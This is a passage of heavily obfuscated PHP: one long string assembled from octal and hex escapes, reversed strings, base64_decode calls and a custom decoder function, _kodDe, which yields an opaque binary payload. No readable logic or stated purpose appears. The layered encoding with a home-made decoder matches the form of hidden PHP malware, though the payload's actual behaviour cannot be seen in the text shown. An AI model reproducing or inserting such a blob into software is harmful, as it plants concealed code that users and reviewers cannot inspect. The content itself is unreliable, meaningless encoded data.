'."\n".'؆/?QCI')."\226\342\54\24\143\314\261\361\317\262\34\134\176\35\165\312\371\161\147\136\61\145\47\253\272\165\225\222\242\342\142\27\40\103\300\131\136\16\54\215\140\173\100\227\307\120\60\102\62\264\103\50\20\46\22\212"."\x4e\xea\x11\xea\x23\x49\x79\x61\xf8\xe7\xfb\x9\x70\x12\x5d\xe1\x64\x22\x78\x78\x96\x44\x28\xbb\x2a\x1\x7c\x5d\x1d\x97\x79\x1b\xdb\x69\x7d\x48\xd9\xa3\xf9\x1c\x97\x8f\xe2\xaa\x65\xfc\xe2\x5a\x62\x15\xe0\x50\x80\xe8\xe4\x4a"."\255\166\362\261\212\166\5\172\27\306\173\202\76\177\167\74\320\13\130\140\264\34\336\27\362\171\350\340\213\360\216\140\264\313\2\355\3\174\142\261\247\73\140\107\367\57\15\104\242\221\212\111\0\326\347\267"."\xa5\x80\x1d\x53\x28\xec\xef\xc\x2c\x65\xd1\xce\x80\xbf\xdb\x17\x89\x7b\x3d\xde\x2e\x8e\xd3\xeb\xe9\x21\x91\x78\x1a\xee\x59\xc\xb7\x15\x3f\xe\xb8\x79\x84\xed\x7c\xe2\xc3\x70\x17\x47\x3b\x33\x6e\xd9\x66\xc4\xa9\x0\x1d\xe7"."\x74\x2\x96\x20\x85\xd0\x26\x69\x2e\xdc\x3b\xa2\x96\x10\x91\x36\xa9\x95\x28\xb5\x32\x19\x2c\x4f\x19\x44\x5e\x26\x33\x54\xa6\xcb\x4b\x35\xfe\xa9\x91\x3c\x11\xc9\x2c\xc6\x19\x2b\x48\x8c\xb1\x20\x6a\x6\x8d\x3\xa1\x8b\x7c\x5f"."\42\314\267\254\6\161\210\323\241\244\65\135\371\76\200\47\155\62\302\260\305\301\274\341\151\140\4\74\150\223\12\50\1\215\110\234\316\105\3\210\367\36\132\235\64\337\40\306\203\140\47\355\201\333\313\370"."\222\160\260\167\76\311\60\222\125\150\5\2\244\373\253\251\110\102\166\231\46\147\111\100\236\220\271\150\110\73\175\225\106\273\162\15\376\71\32\377\0\21\214\174\134\51\320\136\117\100\306\314\30\7\335\102"."\200\331\102\231\252\126\142\137\113\150\132\216\316\143\260\326\62\176\301\366\247\253\14\112\44\243\224\71\115\247\253\26\131\34\242\301\205\376\336\70\245\54\34\23\250\21\3\300\216\57\30\46\35\142\152\203".strrev(' tB˘%<M@'."\r".'wNwLw!`+	]wiRT2t')."\325\106\173\115\113\314\35\163\127\267\267\364\173\234\343\262\163\274\316\71\333\71\60\75\346\252\231\116\0\3\253\33\34\115\153\41\2\100\154\77\152\0\374\264\306\332\247\306\234\107\37\263\162\136\177\154"."\x60\x5a\xcb\xf4\xc9\x31\xd7\x51\xb1\x91\x81\xda\x9a\x76\xfa\x9d\x64\x49\x7\x7b\xab\xe4\x18\xab\x6a\x6a\x7a\x35\xa8\x12\x10\x4d\x18\x4a\x1\xb1\x44\x1\x81\x26\x8c\xab\x45\xe\x5d\xdd\xbc\x96\xc2\xc1\x18\x2a\x19\x9e\xa3\xdf".strrev('*zZ{gA`By»(p×8,o@.>')."\x5d\x4b\x7\x32\xa3\xd0\x65\x19\x1e\x47\xe9\x84\x3a\x4b\x5\x75\x88\xee\xd4\xb\xca\x10\x9\x68\x26\xa5\xef\x84\x62\x8e\x28\x94\x3c\x0\xdc\x12\x7\xc4\x41\x37\x5f\x20\x49\x88\xe5\x90\x90\x46\xbe\xc0\x37\x3d\xa\xda\x1\x90"."\x56\x14\xe3\x50\xec\x1a\x61\xb1\x94\x52\x20\xe3\xb4\x17\xc1\x36\x92\x72\x51\x89\x8\x2d\x8c\xc7\xa3\x9e\x8e\x6e\x7f\x9c\x72\x18\xc2\x89\x69\x1c\x71\xc5\xe\x76\xb6\x5\x9a\xc6\x39\x2a\xdb\x49\x72\x71\xd8\x18\xca\x49\x88\x19"."\110\212\256\153\172\13\72\267\63\112\105\50\213\201\275\217\11\372\123\2\73\141\251\265\115\302\335\114\270\104\134\354\364\242\114\245\11\270\107\145\22\202\273\72\26\53\365\53\251\201\176\100\310\262\63\75"."\260\272\161\155\15\225\200\335\61\360\37\215\140\376\105\152\134\344\343\147\0\131\53\151\262\5\267\354\170\51\316\70\40\254\2\73\45\320\164\266\316\102\70\227\132\115\315\224\163\14\15\246\105\41\204\162"."\x1b\xba\x56\x93\x9d\x36\x1e\xc0\x6e\xce\x84\xe0\xea\x2c\x1c\xbe\x21\xe\xd9\xcb\x4e\x96\xd8\x81\x81\x70\xee\x3\x60\xe\x21\x8a\xff\x6d\xad\xa2\x6c\xba\x0\x26\x82\x97\x2f\x52\x1\x9f\x93\xc\xa2\x67\xa9\x33\x40\x4\x78\x16"."\x50\xa9\xa8\x29\x83\xe9\x6c\x52\xa8\xa1\x95\xf4\xa4\xc2\x70\x2c\x42\x86\x29\xeb\x60\xcd\xe2\x92\x1d\x94\xc1\x84\xd3\x41\x50\x73\x7\x3c\x4d\x70\xc0\x35\xd5\x1\xa4\x3d\x7\x3c\xae\x71\x70\x89\xd5\xc1\xf\x2\x1c\x4c\xfe\x74"."\20\261\324\301\113\47\301\200\317\241\32\76\44\36\243\162\121\22\255\263\231\205\333\352\234\74\346\300\365\357\126\206\225\234\203\326\336\101\33\345\240\55\160\240\375\206\217\324\246\17\320\7\251\15\12\2"."\46\221\165\300\341\200\143\113\113\201\101\332\15\114\250\166\160\201\333\221\321\265\122\61\104\277\44\304\160\145\10\200\327\224\1\302\232\146\72\350\6\210\5\172\30\7\202\325\341\241\305\174\300\171\355\331".strrev(',rJÇ!]C9M"g*"W;~F%~NCa+8ŇL(`:〚I')."\xc9\x37\x37\x3e\x61\xb7\x64\x8d\xb1\xa1\x47\x74\x58\x89\x98\x2a\xf\x3d\x23\x10\x46\x6b\x93\xf6\xda\x8b\x52\x36\xa7\x23\x42\x3e\x16\x62\x9b\x90\xba\x79\x9b\x82\x45\xbe\xe2\x40\x86\x10\x1\x7c\x50\x98\xf2\x14\x14\xe4\x1c\xa6".strrev('`:glƿqŪD,C㣆(I.R޶&(3^fYRHHVD')."\xd4\xc2\x98\x5a\x10\xf7\xee\x1c\xca\x79\x1e\x27\xa\x48\xde\x3c\x86\xfb\x78\xa2\x30\xe6\x2d\xfc\x6c\xc0\x41\xce\xc\x1c\x60\xdf\x38\x28\x70\x3d\xbe\xc7\x5\xb5\x87\x59\x85\xba\x93\x92\x6c\x35\xa7\x13\xd0\x69\x8d\xf2\xf9\xd8"."\x7\xb6\x49\x71\x1b\xa9\x12\x22\xcd\xca\x3a\xef\x65\x3a\xc7\x20\x61\xb3\x56\x19\x10\x85\x47\x5\xb4\xb4\x3c\xcc\xd9\xbd\x25\x8f\x30\x33\xc\x73\x8c\x1d\x73\x8\x41\x6b\xa1\x38\xea\x9b\x28\xd2\xc5\x76\x7f\x95\xa2\xe2\xa4\x53"."\x8d\x6e\xd0\x9b\x95\xc2\xa8\xa5\x51\xad\x62\x14\x49\x5\x12\x90\x7\xe8\x11\x18\x15\xef\xe3\xb6\x63\x6\x10\x15\x46\x2a\x6e\x39\x91\xc0\xd5\xf0\x30\xd6\x7\x4\x9b\x1c\x18\x1\xdd\x5\x27\xc9\x7c\xc8\xd8\xc4\x55\x88\xaf\x50"."\x90\x99\xe2\xb0\x80\x54\xb4\xf3\x40\xb\xaf\xae\xb4\xf0\xd9\xb9\xb5\xd\x6a\x8b\xf2\x8f\x5a\xf8\x4e\xd9\xea\x44\x84\x13\x22\x8b\xd6\x11\xaa\x4f\x81\x5d\xa3\x4b\xc7\x9c\xcd\x5\xc4\xf\x72\x55\xe3\xa8\x13\x96\x37\x3e\x7d\x57"."\x1b\x63\x86\xa9\xe4\x9\x27\x5c\x6b\xeb\x1d\x13\x6c\x6f\x12\xb2\xee\xd2\x41\x8d\x78\x45\xf9\x92\x40\x84\x8f\x12\x3\xc\xd8\x31\x70\xf1\xdd\x1a\x95\x85\x21\xfd\xfb\x53\xaa\x9\x21\x90\x9b\x69\xf4\xd0\x8a\x23\xa\x6c\x9e\xc1".base64_decode('hAJRl7jKxiCnDpJcjqkWzEqc3FWLeK6Lrz3iyiVeCkE03nJ4yYRDwnVqnt06IaDLMLUiTxGiOFk=')."\110\342\205\12\130\254\363\121\15\301\12\220\102\362\1\357\102\204\113\362\42\11\32\23\267\53\7\60\134\42\53\362\350\72\45\22\334\74\170\202\3\200\42\10\116\327\10\75\101\254\304\221\161\341\376\141"."\176\115\212\213\202\37\166\341\5\312\45\247\122\101\172\274\46\206\313\121\305\323\204\312\5\241\233\153\126\224\20\253\214\356\311\345\370\65\230\75\76\141\26\74\127\305\114\42\144\302\154\235\110\10\246\367"."\17\225\140\114\246\353\264\321\20\237\161\374\232\321\56\362\132\231\317\17\211\143\145\63\200\17\150\345\70\344\217\131\265\240\30\154\145\322\215\112\174\346\207\344\33\213\324\153\25\144\104\11\206\54\207\274"."\271\142\267\102\362\237\210\26\140\232\160\250\4\366\120\0\40\256\43\354\344\204\363\35\141\251\104\313\116\334\264\54\373\141\124\206\60\37\54\103\14\346\37\156\121\247\256\345\3\101\60\277\52\23\235\35"."\117\241\147\107\210\251\215\262\55\231\230\11\20\11\134\205\46\52\223\46\263\242\370\222\365\340\35\17\136\372\300\213\177\172\342\232\343\161\374\306\173\357\372\6\207\206\306\64\65\231\47\102\102\23\376\131"."\363\23\364\213\302\134\173\350\304\245\171\155\363\246\103\236\270\273\375\234\346\123\336\31\277\313\161\352\355\123\157\172\146\377\145\347\344\137\273\135\131\170\373\27\167\257\273\167\212\333\277\0\374\255\130\176"."\325\205\356\107\356\156\376\317\363\127\76\332\260\362\260\346\334\43\77\315\75\274\351\367\17\237\172\350\340\155\277\151\174\350\237\361\355\347\174\25\73\47\374\341\315\173\326\376\257\361\326\163\317\30\317\215"."\335\374\331\263\167\234\162\306\345\73\336\176\352\253\313\327\334\362\360\157\256\325\146\357\30\354\74\342\256\104\366\376\350\271\233\356\113\145\17\72\344\265\326\271\173\15\315\373\171\155\363\311\373\135\342\174"."\357\214\115\247\35\262\327\344\353\236\235\272\353\227\65\267\75\165\360\277\327\234\76\367\226\137\334\277\143\363\35\217\136\71\343\253\113\173\77\373\356\310\255\207\236\176\362\327\177\73\53\77\135\376\355\332"."\307\367\34\130\377\314\360\236\207\375\341\324\375\116\172\367\356\331\133\76\374\325\135\47\157\136\371\107\371\300\303\242\216\227\272\336\17\77\137\367\373\307\176\61\376\336\313\207\174\165\344\127\55\155\303\173"."\x3e\x7e\xdd\x89\xcd\xeb\xae\x93\xa2\xaf\xed\x7f\xf7\xb7\x6d\xa7\x9e\xf7\xf0\xdd\x4d\xbf\xfb\xc5\xac\x57\x8f\x7c\x77\xbb\x74\xe0\x86\x96\xa5\xbd\xae\xbd\x37\x6e\x7a\x61\xe8\x86\xf6\xd0\x19\xab\xf3\xae\xa5\x77\xc4\x8e\xf8\xeb"."\244\313\76\270\351\232\257\66\214\334\266\337\133\107\355\172\357\337\376\354\175\334\23\155\74\377\245\115\167\315\177\374\345\137\55\157\275\341\226\266\35\37\134\374\371\316\111\277\333\265\375\154\145\325\214\373"."\252\3\175\261\135\7\256\233\71\375\202\251\157\76\137\134\277\320\314\55\165\125\337\363\126\376\363\63\167\356\22\333\374\144\333\353\157\376\144\347\306\67\77\50\154\232\263\140\105\323\266\315\317\67\177\171"."\373\242\353\336\71\147\367\221\347\117\371\307\223\257\167\56\273\351\251\135\216\34\71\364\72\377\141\201\333\157\174\152\345\365\312\253\367\136\245\266\154\376\363\324\336\337\246\257\277\155\362\165\343\175\133\16"."\174\361\344\47\76\72\147\105\354\302\33\116\136\170\364\23\325\327\57\126\322\147\317\232\366\323\320\73\57\375\351\305\335\76\113\304\166\67\226\356\65\360\347\33\244\145\315\267\56\172\366\246\173\366\172\64".base64_decode('2f5S0+G/vePq116KzFxw/WR11a+f2mPni7ftdr/ymnr6PpGXtyzfS051xf42985FJ6zd98vdNnU=')."\xdf\xfe\xf3\xf9\x67\xf6\xee\x73\xcb\xef\xf\x6b\xf8\xf9\x3e\x53\xfe\xb7\xed\xf8\x9f\xed\x7e\xe7\x91\x7b\x1c\x3c\xe7\x4d\x5f\xe9\xc9\x5\x7b\xef\xb2\xef\x39\xd7\xfd\xe4\xbd\xb7\x77\xdc\x7b\xca\x4f\x9e\x3c\xe4\x17\xc9\x8d\x72"."\42\377\106\327\13\33\366\170\160\350\375\306\256\301\342\272\223\216\133\271\140\315\306\137\274\176\353\143\217\24\366\154\136\272\367\150\376\336\322\323\322\326\53\47\177\174\126\123\344\304\223\337\234\265\341\261"._kodDe('KFRd8y/c5K+P0zO1lWWp199rjK0h0MT0r8p+vWFvNajGxdVWr9NErWOUDDUCx+8T972DbVXG3P0h')."\315\376\140\362\252\217\227\336\357\172\302\165\331\257\357\130\132\70\240\377\27\213\166\135\364\346\27\15\377\157\353\336\357\356\273\135\166\376\155\373\33\217\30\357\256\133\177\366\103\357\177\327\75\350\112\146"."\xce\x79\xfc\xb3\x63\x3e\x7c\xe5\x61\x5f\xdb\xc7\x4b\x3f\xfe\xfa\xca\x2d\xa7\x5c\xff\xde\xaf\x36\xed\x9f\xae\xbf\xe6\x82\x39\xdb\xbd\x75\xfb\x1c\xfc\xba\xf1\xd9\xd6\xb7\x7e\xbb\xe5\x3e\xe7\xb1\xd5\xca\xe2\xc4\x8b\xbf\x3d\xfd"."\xb6\x3f\x56\xeb\x91\x65\xef\x16\x76\x5e\x74\xc5\xc6\xb3\x5f\x3c\xb6\x6e\xf3\xea\xfb\x9e\x77\x9c\x71\xee\x3e\x5f\x39\x56\x6d\xfd\xf9\x65\x67\x1f\xff\xd0\x39\xc7\x99\x43\xd7\xfd\x65\xfc\xb1\x2b\x3\xbe\x13\x97\x1d\x7e\xe6\x29"."\373\36\24\370\170\113\356\355\276\326\13\257\16\134\372\100\272\176\316\206\175\256\171\346\205\311\327\65\177\364\237\141\357\354\33\367\33\376\374\343\271\47\354\376\366\355\221\355\77\333\176\301\5\253\237\376"."\x73\xed\xa4\x4f\x3b\x97\x3d\x72\xf3\x5\x1b\xf6\xff\xe3\xc5\x37\xad\xfa\xe3\x4f\x2f\xda\x7c\x8e\xe7\x8a\xb6\x69\x6f\x79\x8e\xfd\x66\x9d\xf4\xd3\xc9\x53\x76\xd1\x4b\x27\xf6\x95\xe\x7d\xf0\xa5\xc9\xa1\xcd\x7f\x5b\xbf\xeb\xe0"."\x94\xdb\xd7\x4d\xbd\xee\xaa\x57\x7c\x85\xf7\x6b\xd6\xbd\xb3\x74\xea\x5b\xa9\xe4\x11\xcb\xe6\xfc\x6a\xe9\xbe\x97\x1d\x54\x7d\x5e\xe0\xe0\x49\x17\xf7\x7b\x7e\xd7\x7b\x85\x69\x3c\xb4\xf6\x8a\x97\xe6\x5c\xfa\x71\xeb\x35\x6f\x6e"."\271\175\365\115\75\327\274\362\217\175\17\375\350\332\365\47\334\176\333\215\311\331\207\36\336\60\354\14\237\177\100\103\364\251\47\17\255\113\136\271\317\117\337\372\333\211\347\356\374\170\103\315\21\33\6\23"."\175\77\253\72\55\241\173\42\203\47\74\145\154\372\364\313\265\205\352\207\67\105\377\240\170\137\176\357\372\135\177\371\313\75\162\375\155\27\357\135\135\173\321\136\67\35\176\322\275\173\254\37\75\340\357\207"."\x1e\xed\x7c\xcc\xf9\xe6\x3e\xc5\xc3\x3f\xba\xf1\xfa\xbb\xaf\x59\xf5\xa1\x32\xfe\x97\xce\xd6\x81\xff\x3c\x71\xf0\xc2\xd2\xa9\x77\x7e\xd4\x3c\x5e\x7f\xec\xeb\xa7\xdf\x7c\xd1\x8c\x53\x8e\xff\xfb\x71\xab\xff\x72\xe7\xf1\x35\xaf".base64_decode('P7ro9K1vz7kg9eUX69Wv/viHi1+55JA/r588562O+774XP3w7y8pw1cMTl137vJl//w8tu6i1PU=').strrev('p>>kolȅg;tdgf=\\_Mo')."\351\43\157\207\76\270\353\356\345\33\27\357\327\124\167\366\107\247\256\173\243\355\375\375\226\136\126\275\376\322\157\37\361\334\360\223\267\27\336\361\326\321\247\337\375\361\325\103\353\156\271\347\254\241\257\66"."\304\376\226\73\360\270\327\247\237\251\175\362\301\265\327\235\371\354\120\303\62\327\346\171\253\116\272\372\375\73\227\237\253\334\267\374\370\273\336\356\174\156\322\205\357\256\376\370\323\15\257\235\342\136\76\351".base64_decode('iZGv7596xCJz2h8enXzAy8svfM2vv3Zv6ZIzP/nfl8z7oiviK5bfd5d52jPPfXrWBbXX37/ikH8=')."\xae\x7b\xe5\xbe\xa3\xe7\xcc\xb8\xb0\xa5\xe5\xb9\x3f\xa5\xf6\x58\x10\xfe\xfa\x9d\x73\xcc\x77\x1e\xbf\xe5\xb2\x81\x1d\x9f\x6d\x5b\x72\xcb\xce\xf1\x2f\xbf\xfd\x60\xcb\xe5\x97\x1f\xf3\xc5\x8e\xc7\x5f\xfe\xe8\x95\x4f\x56\x6c\xdc"."\xf9\xf9\x8e\x2d\xed\xcf\xb5\x8f\xe\x7d\xf6\x41\xdc\x15\x7f\xf0\xfe\x1d\xff\x71\x1f\xba\xc9\x53\x3c\xf2\xb3\xd5\x6f\x7d\x77\xdb\x87\xb7\xfc\x67\xf7\x33\x9e\x8\xfc\xe3\xe9\x3f\xb5\x6d\x3b\xc8\xf5\xe1\xe1\xb9\xbf\x4e\x3e\x68"."\x81\xef\x91\xc7\xcf\xdb\xf2\xe8\xbd\x87\x3c\xfa\xb3\x59\xf\x3f\xf6\x6b\xf5\xfa\xeb\xf\x9b\xaa\x5e\xf9\xbb\x6c\xfd\x92\xdd\x36\xc7\xc6\x4f\xcd\x3d\x32\x7d\xf7\xd5\xa7\x1c\xf6\xd3\x79\xcf\x9f\x14\x58\xd5\x30\xf3\xf7\x57\x1f"."\60\175\333\107\341\236\316\345\213\66\66\257\271\176\375\235\103\261\237\137\170\316\317\57\131\366\306\241\146\146\373\143\123\36\54\255\333\166\162\365\263\351\307\17\336\375\213\127\177\166\356\366\7\316\372\367"."\147\137\57\65\237\270\363\364\364\366\23\133\335\165\167\76\370\307\373\353\307\356\374\366\271\277\75\375\367\363\67\77\263\140\237\127\157\233\174\341\302\63\57\134\174\301\127\303\367\174\373\227\213\257\74\263"."\x77\xdb\x5f\x27\xfd\x6e\x5e\xfd\xa2\x27\x16\x5e\xfc\xcb\xd5\x55\x7f\x4e\xbc\x74\xe8\xa1\xff\xf3\xe0\x9d\xa1\x85\xb3\x2f\xbc\xc2\x77\xd8\xdf\x4f\x3e\x51\x3a\x58\x7d\xfc\x5f\xe9\xa5\xcf\x7e\x78\xf0\xd4\xc7\xf6\xfd\xd5\x29\x6f".strrev('uK?Ki\\\\muTg[t}3uwؒ]Z5^'."\r".'I')."\51\347\357\357\370\253\61\360\314\137\266\235\161\310\235\227\156\57\136\367\344\316\177\267\257\72\374\204\317\132\117\133\77\166\306\301\265\305\330\175\341\227\256\332\320\70\373\260\157\32\257\173\365\223\23\76"."\x8c\x7e\xf1\xc9\x2b\xfd\xfb\xdd\xf3\xd2\x9b\xaf\xd7\x5e\x76\xe9\x9b\x1f\x9d\x34\x7f\xfd\xd5\x17\x3d\xf0\xda\x9b\xad\x37\x9c\x77\x44\x29\x7c\x84\x79\xff\xfa\xab\x6f\xba\xea\x21\xe5\xc8\x5f\x7c\xb0\xf1\xdf\x7f\xbb\xbe\xf1\xa2"."\347\216\336\370\217\115\363\76\133\336\337\363\77\267\364\66\237\372\361\307\317\175\73\374\327\53\66\36\25\112\266\174\76\163\301\324\150\355\121\237\346\276\334\372\364\347\341\233\356\73\77\361\363\243\346\237"."\xf2\xef\x23\x2f\x5b\xe4\x4f\x1e\x75\xc0\xb4\x73\xc3\xbb\xec\xf5\x51\x70\xc3\xca\xdf\x6e\xbf\xdf\xb1\x78\xfb\x37\x7b\xef\x72\x67\xee\xf0\x3b\x16\x1e\x73\xd6\xc2\x47\x96\x1f\x74\xf5\x79\x5b\x66\x7e\xfd\xec\xaa\xee\xa7\x8e\x31"."\217\77\344\67\27\354\121\375\257\147\137\337\363\322\253\346\175\341\14\36\176\350\375\173\335\20\73\146\133\46\266\313\314\47\76\71\356\353\76\343\117\17\324\366\36\361\323\203\277\131\77\336\30\111\256\274"."\275\172\227\27\213\377\70\371\227\235\117\317\335\360\154\363\157\216\374\46\324\233\73\142\354\313\330\276\301\333\146\334\361\306\170\365\323\247\74\367\176\274\171\374\27\207\137\360\351\213\75\213\35\35\356\63".base64_decode('62ecffDnV6x4OLDjhP9ZGn3g/XPO++ie+6+aXXfxq/865yR59fsb3O/MPPLi0aNPPuKM74rv/fw=')."\271\201\223\77\222\126\137\221\150\271\260\343\111\377\360\301\113\75\307\356\361\372\137\376\336\376\310\206\13\16\334\174\302\135\236\173\15\367\267\247\337\330\274\377\364\323\337\66\27\35\272\240\152\252\317\163"."\xe9\xf4\x4d\xc7\x9d\xf6\xd1\x21\xa5\x8d\xd7\xe5\xef\x8d\xba\x3f\xbe\xfb\xf\xfb\xdd\x7d\x5a\x66\xfe\x9d\xff\xaa\xdb\x7b\xbf\xa7\x9e\x7a\x6a\xeb\xa7\x9e\x17\xfa\xe7\xdf\xde\x37\xfb\xb5\x37\x6f\x3a\xb2\x77\xbb\xba\xbe\xfa\xa6"."\x8f\x37\x3d\x16\x79\xf6\xc9\x95\x7b\xcb\x7a\xf4\x85\x4f\xfe\xb8\xf9\x89\xed\x7b\xef\x7f\xc9\xc3\x4b\x5c\x9f\x6c\x9f\x71\xcf\xaa\x97\xb7\x9c\xff\xe7\x33\xaf\x7c\x31\x7d\x45\xdf\x4b\xcf\xdf\x5e\x52\xe\x4c\xb4\x2f\xdf\x25\xbf"."\xff\xab\xea\x4d\xb7\x9e\xde\xf5\x59\xf1\xe6\x15\x3f\xf7\x9c\xf1\xf5\x26\xff\xe7\x5f\xc4\xf7\xbc\x60\xef\x47\xbd\x3b\xef\xd8\xd7\xdb\x35\x3b\x70\xfa\xea\xc4\xaf\x9e\xf8\xcf\xec\xa6\x23\x4f\x19\x8\xd\x9e\xf9\xdb\x43\x8f\x78"."\x4a\x7d\x64\xd7\x5d\x77\xd4\x6f\xdd\xf3\x55\xbd\x66\xa3\xf6\x93\x63\xa6\x7f\xb0\xef\xd0\xe2\x19\x7d\xfe\x1b\x6f\xba\xe6\x80\xe9\xcf\x2d\x79\xe6\x84\xf\xff\x70\xcd\xb\xb7\xde\x7a\xa9\xf7\x94\xec\x82\xe1\x7f\xfd\x6e\xcf\x5f".strrev('O^x>|}lvwnd_}K;lf>w__-:;5{>')."\266\13\277\373\266\145\347\127\137\136\356\212\157\174\140\307\173\307\177\21\377\356\343\35\177\337\317\375\320\267\233\137\336\166\371\316\257\336\272\174\350\351\135\273\37\275\162\301\216\157\337\75\376\253\137\56"."\372\350\266\137\35\170\210\357\17\367\15\155\173\142\363\376\352\277\16\274\144\165\323\3\377\271\354\371\315\275\233\373\327\336\361\102\56\237\377\344\316\221\257\132\376\375\263\67\37\275\172\305\157\212\153\364"."\117\166\36\177\122\327\313\146\156\357\236\301\246\273\217\270\160\364\240\366\53\336\371\300\74\364\322\103\256\71\47\266\342\255\153\243\203\67\214\34\263\347\212\343\357\365\376\143\335\246\213\256\177\352\324\354".base64_decode('t9se+ucLT/+ya+ceF117ybRVn578l9NiB3+Q9V5/3pQjjmtKXzBv8alHXnJW/eqX7/jZ9ecu3us=')."\326\337\155\214\314\273\362\224\154\377\365\123\317\173\343\225\35\135\321\127\37\330\174\357\156\337\375\144\156\142\305\332\23\17\245\252\315\343\5\105\117\144\311\225\5\121\10\250\157\46\327\72\215\215\263\211".base64_decode('bG1ktGSe7A9mNxNtzkS6mBk3Sd7ZjUStYTA3lEomVpESSP7xfKa4iqjPNDQTzCYik2bN8UElRS4=')."\x8c\x66\xcf\x20\xd0\xb1\xbc\x56\x18\x4d\x10\xe9\x75\x46\x3d\xa9\xd2\xec\xfa\x66\x2a\xbe\xf\xad\xca\x8d\x13\xe9\x7d\x56\x1d\x49\xce\xe4\x74\x2d\x2d\x13\xc9\x98\x7c\x26\x6f\x14\x7\x4b\x43\xf4\xe3\x64\xe3\x65\xe\xaf\x2a\x8c"."\320\15\221\222\36\52\44\311\171\330\254\31\244\315\63\32\111\345\115\245\224\321\212\62\375\22\125\327\114\17\1\60\251\164\375\114\162\252\62\256\312\312\150\122\243\375\110\152\140\32\243\303\112\172\234\264"."\266\250\251\243\43\244\270\21\131\35\315\321\3\211\261\342\160\122\316\220\42\215\104\251\220\123\145\272\117\34\33\312\244\311\351\145\143\35\255\130\102\36\317\351\344\334\246\241\221\164\101\316\30\223\123\12".base64_decode('GRVj1VhOZae6heywkiJFFkZT4wmZDOmMWaSmpfFUIUN3FqUR2cxoJHN9HWniLNKFs2Y30o6iY1M=')."\x37\x13\x7\x66\xd2\x76\x8f\x15\x56\x8d\xaa\xc3\x74\x5f\x3a\x9e\x19\xd4\xc9\x8e\xac\x79\x36\xc9\x53\x4a\x67\x92\x9\x99\xb4\x6c\x95\x91\x94\x4b\x9\xa2\x9b\xd5\xd4\xdc\x4c\xbb\x91\x8e\x8\x25\x98\xa6\x6\xf2\xa1\xfa\x26\x12"."\320\362\245\214\101\157\325\146\67\221\14\132\241\64\234\35\45\135\321\100\333\330\130\117\52\276\112\115\244\262\243\364\276\124\61\207\306\207\311\321\366\340\130\56\253\246\310\371\341\314\72\122\134\312\320\223"."\243\143\364\314\106\311\245\63\72\151\333\114\112\374\115\224\116\107\213\71\171\125\211\20\335\54\332\41\332\130\41\241\123\213\201\206\331\204\224\322\371\134\252\230\40\103\321\114\111\151\244\144\252\372\340\50"."\x25\xfb\x19\x74\xa4\x48\xaf\x8c\xd\x2a\xc3\xb9\xbc\x4c\x93\xc9\xd8\xf\x15\xe4\xc4\x38\x99\x7b\x43\xba\x9c\x2e\xe4\x9\x39\xd\x15\xb5\x55\x19\xaa\x44\x3a\xb8\x2a\x95\x2d\x24\x8\xe1\x14\x53\x59\x7d\x90\x69\x50\xd2\xef\xcc"."\156\232\105\107\267\216\366\37\15\64\222\257\15\47\344\374\330\40\65\127\50\345\106\230\326\111\103\43\245\204\331\15\224\151\20\310\354\6\362\205\231\63\147\122\102\42\115\152\246\364\323\104\62\245\1\71"."\152\143\264\215\63\10\232\62\146\350\43\31\102\45\111\305\34\314\347\110\123\32\147\120\222\234\115\206\154\60\235\220\107\62\143\264\5\244\115\15\224\2\14\300\3\112\171\172\200\234\321\163\112\232\120\113"."\142\304\30\117\321\113\325\101\55\261\52\225\244\67\332\143\131\131\317\220\155\370\262\74\11\164\310\311\101\172\356\13\366\360\146\311\260\41\120\235\366\244\250\20\71\250\50\124\363\217\352\26\362\273\133\243"."\204\364\161\151\72\337\361\303\243\22\341\216\27\106\43\42\156\262\140\12\311\40\146\111\205\272\170\360\140\202\307\350\11\172\304\324\164\166\353\215\225\123\134\260\206\56\153\203\50\7\44\30\251\204\45\235"."\x41\xe9\x71\x86\x3d\x25\x6d\x87\x27\x50\xd7\xc5\xc5\x88\x8b\x76\x47\x42\xe8\x56\x7c\x62\x6d\xca\xc6\xa0\x4b\x4\x3b\xc5\x54\xb5\x0\x4a\xce\xe5\x5c\x56\x63\x98\x38\xfa\x8f\xf4\x16\x36\xb5\x30\x94\xa1\x92\xc2\x14\x87\xa1\xe9"."\4\35\246\70\127\351\344\55\344\127\216\2\214\367\261\320\25\326\101\23\124\273\212\51\215\101\123\206\305\212\207\120\143\176\14\106\205\260\255\113\134\274\146\325\60\130\123\251\307\205\132\221\316\160\303\316"."\160\243\2\171\73\155\303\44\326\72\56\247\211\32\163\240\140\207\220\171\11\57\264\62\212\31\47\304\114\62\166\170\42\1\157\74\344\241\372\171\162\261\350\206\232\57\120\201\220\353\270\46\263\112\162\60"."\56\47\64\335\244\247\241\160\245\243\227\74\370\133\70\234\141\347\315\374\360\223\364\6\107\42\167\13\145\243\206\350\314\72\25\54\24\150\235\104\344\24\22\31\325\70\44\374\101\207\204\156\373\44\253\301"."\107\300\47\261\153\121\221\16\305\112\352\12\140\377\111\126\301\342\230\224\226\101\326\124\213\224\6\63\117\242\372\312\222\251\321\260\130\65\361\332\321\326\30\313\114\266\67\307\222\10\206\276\304\154\51\330".base64_decode('nYd4PIpuX3mdcZTdqURASezWWFdSKlWWU/IIkyqoojsTpqWXzClA4hfva+a2g5GHVnPmnHZiw0M=').strrev('KQ8rT*\\8@@Mmu߳XIw.').base64_decode('9VjbDyrsZF0CmgmmQ8pACkdk9k0mwyGY7IR5b8LsqHO/J6spNr0IplyB6Q8ZOZneKRlgHqoFhY0=')."\x43\xc9\x60\x27\xe3\x50\x13\x2f\x9e\xcc\x69\x94\x1d\x82\x31\x8b\xa7\x54\x92\xd8\x1d\xe8\x88\xfb\x2\x61\xbe\x72\x51\x73\xc\x4f\x28\x10\x8f\x44\x82\xc2\x7c\x6e\x11\x98\x12\xd4\x70\xe7\x97\x8d\x30\xc6\x35\xdd\xe1\x71\xbb\x78".strrev('IK$J6!OQ"dJٟqU8a<z^DťAN#i').strrev('Cc08He+ ѽǷPI,H'."\n".''."\r".'